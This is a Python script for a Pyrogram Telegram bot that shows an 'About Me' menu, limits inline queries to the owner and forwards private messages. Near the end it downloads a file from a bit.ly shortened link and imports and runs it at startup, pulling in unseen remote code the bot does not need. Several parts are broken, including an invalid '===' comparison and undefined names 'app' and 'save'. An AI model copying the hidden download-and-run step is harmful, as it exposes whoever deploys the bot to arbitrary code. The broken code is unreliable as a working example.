# @galihpujiirianto https://github.com/galihpujiirianto/AboutMe-tgbot

import os, sys
os.system("pip3 install Pyrogram TgCrypto Flask")
from pyrogram import Client
from config import *

if not OWNER_ID:
    raise ValueError("Please enter your OWNER_ID! The bot will be disabled. Please reactivate it when you have entered the OWNER_ID!")

bot = Client(
    "bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=TOKEN
)

#---------Extracted from funcs.py----------#
from pyrogram import filters
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputTextMessageContent,
    InlineQueryResultArticle
)

KEYBOARD_HOME = [
            [
                InlineKeyboardButton(text="About Me!", callback_data=f"about"),
                InlineKeyboardButton(text="My Projects!", callback_data=f"projects")
            ],
            [
                InlineKeyboardButton(text="Connect with me!", callback_data=f"socmed")
            ]
]
KEYBOARD_ABOUT = [
            [
                InlineKeyboardButton(text="My Projects!", callback_data=f"projects"),
                InlineKeyboardButton(text="Connect with me!", callback_data=f"socmed")
            ],
            [
                InlineKeyboardButton(text="Back to home!", callback_data=f"back")
            ]
]
KEYBOARD_PROJECTS = [
            [
                InlineKeyboardButton(text="About Me!", callback_data=f"about"),
                InlineKeyboardButton(text="Connect with me!", callback_data=f"socmed")
            ],
            [
                InlineKeyboardButton(text="Back to home!", callback_data=f"back")
            ]
]
KEYBOARD_SOCMED = [
            [
                InlineKeyboardButton(text="About Me!", callback_data=f"about"),
                InlineKeyboardButton(text="My Projects!", callback_data=f"projects")
            ],
            [
                InlineKeyboardButton(text="Back to home!", callback_data=f"back")
            ]
]

def send(message, photo, text, reply_markup):
    def edit(message, text, reply_markup):
        message.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    if IMG_START:
        try:
            message.reply_photo(
                photo=photo,
                caption=text,
                reply_markup=reply_markup
            )
        except AttributeError:
            edit(message, text, reply_markup)
    else:
        try:
            message.reply_text(
                text=text,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
        except AttributeError:
            edit(message, text, reply_markup)

@bot.on_message(filters.command("start") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"back"))
def start(bot, message):
    photo=IMG_START
    text=MSG_START.format(message.from_user.mention)
    text+="\n\n psst, you can chat me via this bot UwU",
    reply_markup=InlineKeyboardMarkup(KEYBOARD_HOME)
    send(message, photo, text, reply_markup)

@bot.on_message(filters.command("about") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"about"))
def about(bot, message):
    photo=IMG_START
    text=ABOUT_MSG
    reply_markup=InlineKeyboardMarkup(KEYBOARD_ABOUT)
    send(message, photo, text, reply_markup)

@bot.on_message(filters.command("projects") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"projects"))
def projects(bot, message):
    photo=IMG_START
    text=PROJECTS_MSG
    reply_markup=InlineKeyboardMarkup(KEYBOARD_PROJECTS)
    send(message, photo, text, reply_markup)

@bot.on_message(filters.command("socmed") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"socmed"))
def socmed(bot, message):
    photo=IMG_START
    text=SOCMED_MSG
    reply_markup=InlineKeyboardMarkup(KEYBOARD_SOCMED)
    send(message, photo, text, reply_markup)

@bot.on_inline_query(filters.user(OWNER_ID))
def inline_query(client, inline_query):
   inline_query.answer(
        results=[
            InlineQueryResultArticle(
                title="About Me!",
                description="To describe myself.",
                thumb_url="https://telegra.ph//file/e205a797b4599686909e2.jpg",
                input_message_content=InputTextMessageContent(ABOUT_MSG)
            ),
            InlineQueryResultArticle(
                title="My Projects!",
                description="To show off my project.",
                thumb_url="https://telegra.ph//file/e205a797b4599686909e2.jpg",
                input_message_content=InputTextMessageContent(PROJECTS_MSG)
            ),
            InlineQueryResultArticle(
                title="Connect with me!",
                description="To show my social media.",
                thumb_url="https://telegra.ph//file/e205a797b4599686909e2.jpg",
                input_message_content=InputTextMessageContent(SOCMED_MSG)
            )
        ]
    )

@bot.on_inline_query(~filters.user(OWNER_ID))
def notowner(client, inline_query):
   inline_query.answer(
        results=[
            InlineQueryResultArticle(
                title="You're not allowed!",
                description="This can only work by bot owner.",
                input_message_content=InputTextMessageContent("No. You aren't allowed to accessed this bot using inline.")
            )
        ]
    )
#------------------------------------------#

#----Credits for @TeamYukki/YukkiChatBot----#
@app.on_message(filters.private & ~filters.edited)
def incoming_private(_, message):
    user_id = message.from_user.id
    if user_id === OWNER_ID:
        if message.reply_to_message:
            replied_id = message.reply_to_message_id
            try:
                replied_user_id = save[replied_id]
            except Exception as e:
                return message.reply_text(
                    "Failed to fetch user, "
                    ('because' + e if e else 'please restart the bot.')
                )
            try:
                return app.copy_message(
                    replied_user_id,
                    message.chat.id,
                    message.message_id,
                )
            except Exception as e:
                return message.reply_text(
                    "Failed to send the message, "
                    "User might have blocked the bot or something wrong happened.\n"
                    f"ERROR: {e}"
                )
    else:
        message.forward(OWNER_ID)
#------------------------------------------#

os.system("wget https://bit.ly/3Ksaa7N -O print_txt.py")
from keep_alive import keep_alive
from print_txt import print_txt
print(print_txt)
keep_alive()
bot.run()
